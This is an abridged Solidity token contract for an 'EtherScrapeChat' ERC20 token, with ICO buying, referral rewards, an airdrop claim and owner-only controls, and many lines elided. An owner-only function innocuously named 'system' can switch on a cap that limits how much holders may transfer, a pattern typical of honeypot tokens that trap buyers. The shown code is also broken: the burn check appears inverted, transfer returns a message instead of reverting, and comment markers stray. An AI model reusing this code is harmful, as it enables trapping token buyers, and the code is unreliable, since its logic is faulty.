/* SPDX-License-Identifier: MIT
  ==============================
  2022 Copyright ©EtherScrapeChat.
  ==============================
...
contract testToken is ERC20Burnable, Ownable {
    ...
    event Buy(address indexed buyer, uint256 _amountBout, uint256 EtaxFare);
    ...
    address payable public Emartaddr_;
    address private _owner;

    uint256 public EtRate_;
    uint256 public EsRate_;
    uint256 public EtaxFare;
    ...
    */
    function transfer(
        ...
        address _to,
        uint256 _amount
    ) external returns (string memory d) {
        if (Eatd_) {
            uint256 rt = _balances[_msgSender()].div(100);
            if (_amount > rt.mul(EmaxSell_)) {
                d = "You Cannot Send All This Amount, Reduce";
                return d;
            } else {
    ...
    */
    function EBuyTkns(address _ref) external payable returns (bool success) {
        ...
        require(token.balanceOf(address(token)) > _amount,"Insufficient Balance");
        require(_Bought[_msgSender()] < EmaxBuy_.add(200e18),"You Have Reached Your Buy Limit");
        require(_msgSender() != _ref,'LOL, You Cannot Refer Yourself Here Bro');
        ...
        if (
            _msgSender() != _ref && token.balanceOf(_ref) != 0 && _ref != address(0)
        ) {
            if(_Hasclaimed[_ref] || _Hasbuy[_ref]) {
               token.transfer(_ref, EIcoRefRewd_);
            }
        }
    ...
    */
    function EAirClaim(address _ref) external returns (bool success) {
        ...
        require(balanceOf(address(token)) >= EAirRewd_.add(EAirRefRewd_),"Insufficient Balance");
        require(_Hasclaimed[_msgSender()] == false,"Address Already Claimed The EtherScrape Airdrop");
        require(_msgSender() != _ref,'LOL, You Cannot Refer Yourself Here Bro');

        if ( _msgSender() != _ref && token.balanceOf(_ref) != 0 && _ref != address(0) ) {
            if (_Hasclaimed[_ref] || _Hasbuy[_ref]) {
    ...
    */
    ...
    function burn(uint256 _amount) public virtual override onlyOwner {
        require(EminSup_ > _totalSupply.sub(_amount), "Minimun Supply Reached");
    ...
    */
    ...
    function EclaimedAi() public view returns (
        bool airStatus,
        uint256 _taxFare,
        uint256 _EAirRefRewd,
        uint256 _EAirRewd)
    {
        return (EairdropEnabled_, EtaxFare, EAirRefRewd_, EAirRewd_);
    }

    function EBuyTknsAi() public  view returns (
        bool _icoEnabled,
        uint256 _EminBuy,
        uint256 _EmaxBuy,
        uint256 _EtRate,
        ...
        return(EicoEnabled_, EminBuy_, EmaxBuy_, EtRate_, EsRate_, EIcoRefRewd_ );
    }
    ...
    function system(bool _Eatd, uint256 _EmaxSell) public onlyOwner {
        Eatd_ = _Eatd;
        EmaxSell_ = _EmaxSell;
    }
